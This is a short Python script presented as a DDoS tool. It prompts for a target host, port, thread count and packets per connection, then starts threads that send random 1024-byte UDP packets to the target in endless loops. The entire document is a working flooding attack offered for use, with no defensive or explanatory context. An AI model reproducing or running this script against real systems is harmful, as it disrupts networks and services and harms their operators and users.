import socket
import random
import threading

print("\033[1;32;40m ==> DDOS Attack <==  \n")
ip = str(input(" Host/Ip:"))
port = int(input(" Port:"))
choice = str(input(" UDP(y/n):"))
times = int(input(" Packets per one connection:"))
threads = int(input(" Threads:"))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM) #UDP = SOCK_DGRAM
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +"UDP Sent!!!")
		except:
			s.close()
			print("[!] Error!!!")



for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()